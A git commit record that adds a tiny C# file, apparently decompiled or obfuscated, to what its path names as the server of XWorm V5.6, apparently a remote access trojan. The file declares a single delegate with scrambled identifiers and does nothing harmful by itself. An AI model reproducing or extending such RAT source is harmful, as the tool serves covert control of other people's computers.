4694b86143476cc3232246e1540e984af61f795c
h1ercarbohydratemap11 <xcytrizen@outlook.com>
2025-09-18 13:51:24 +0400

    Forms52.cs

---
+++ XWorm V5.6/Server/Forms/Forms52.cs
@@ -0,0 +1,9 @@
+﻿using System.Diagnostics;
+using System.Runtime.CompilerServices;
+
+namespace ND845D09595E5BCND4EC1A60N2E1C29C
+{
+  [CompilerGenerated]
+  [DebuggerDisplay("<generated method>", Type = "<generated method>")]
+  internal delegate void N996C633C99F5B070NF6FB25FBEB63FF();
+}
